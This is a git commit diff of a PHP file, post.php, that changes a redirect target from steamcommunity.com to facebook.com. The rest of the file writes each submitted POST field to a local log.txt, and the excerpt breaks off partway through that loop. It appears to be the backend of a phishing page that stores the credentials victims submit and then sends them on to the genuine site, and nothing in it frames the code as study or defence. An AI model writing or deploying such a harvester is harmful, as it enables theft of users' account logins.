be8d01aeaf2b001f4c503a96ed200bf16d65f72b
sunnival <73607503+sunnival@users.noreply.github.com>
2020-10-28 22:05:15 +0300

    fse

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location: steamcommunity.com');
+header ('Location: facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
